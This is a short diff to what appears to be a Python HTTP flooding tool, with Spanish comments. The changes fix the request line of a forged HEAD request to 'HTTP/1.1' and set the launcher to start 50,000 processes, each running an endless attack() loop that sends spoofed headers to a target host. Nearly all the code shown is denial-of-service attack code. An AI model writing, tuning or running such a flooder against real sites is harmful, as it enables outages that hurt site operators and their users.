@@ -27,7 +27,7 @@ def progressbar(it, prefix="", size=60, file=sys.stdout):
     
 import time
 
-for i in progressbar(range(10), "Barra Util: ", 40):
+for i in progressbar(range(100), "Loading: ", 40):
     time.sleep(0.3)
     
     
@@ -55,7 +55,7 @@ def attack():
   connection = "Connection: null\r\n"
   referer = "Referer: null\r\n"	
   forward = "X-Forwarded-Proto: " + randomip() + "\r\n"
-  get_host = "HEAD "  + url + " HTTP/3.0\r\nHost: " + ip + "\r\n"
+  get_host = "HEAD "  + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
   request = get_host + referer  + connection + forward + "\r\n\r\n"
   while True:
     try:
@@ -78,7 +78,7 @@ sleep(1)
 
 	
 def send3attack():
-  for i in range(60000): #Poder mágico
+  for i in range(50000): #Poder mágico
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
